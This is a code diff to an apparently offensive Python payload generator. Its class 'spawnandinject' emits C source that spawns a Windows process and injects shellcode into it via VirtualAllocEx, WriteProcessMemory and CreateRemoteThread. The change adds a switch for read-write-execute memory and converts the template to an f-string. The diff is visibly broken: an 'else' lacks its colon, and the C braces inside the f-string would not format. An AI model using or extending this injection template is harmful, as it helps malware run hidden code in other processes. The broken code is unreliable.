@@ -1,4 +1,10 @@
 class spawnandinject:
+    def __init__(self, arguments):
+        if 'perm' in arguments:
+            if arguments['perm'] == 'rwx':
+                self.memoryPermission = 'PAGE_EXECUTE_READWRITE'
+            else
+                self.memoryPermission = 'PAGE_EXECUTE_READ'
 
     def imports(self) -> list[str]:
         return ["#include <windows.h>", 
@@ -9,8 +15,8 @@ class spawnandinject:
     def compilerOptions(self) -> list[str]:
         return []
 
-    def template(self) -> str:
-        return """
+    def template(self, imports, codeblocks, transformers, shellcodeSize) -> str:
+        return f"""
 {imports}
 
 {codeblocks}
@@ -37,7 +43,7 @@ int main()
     LPVOID pRemoteCode = NULL;
     HANDLE hThread = NULL;
 
-    pRemoteCode = VirtualAllocEx(pi.hProcess, NULL, {shellcodeSize}, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
+    pRemoteCode = VirtualAllocEx(pi.hProcess, NULL, {shellcodeSize}, MEM_COMMIT | MEM_RESERVE, {self.memoryPermission});
     WriteProcessMemory(pi.hProcess, pRemoteCode, (PVOID)shellcode, (SIZE_T){shellcodeSize}, (SIZE_T *)NULL);
     
     hThread = CreateRemoteThread(pi.hProcess, NULL, 0, pRemoteCode, NULL, 0, NULL);
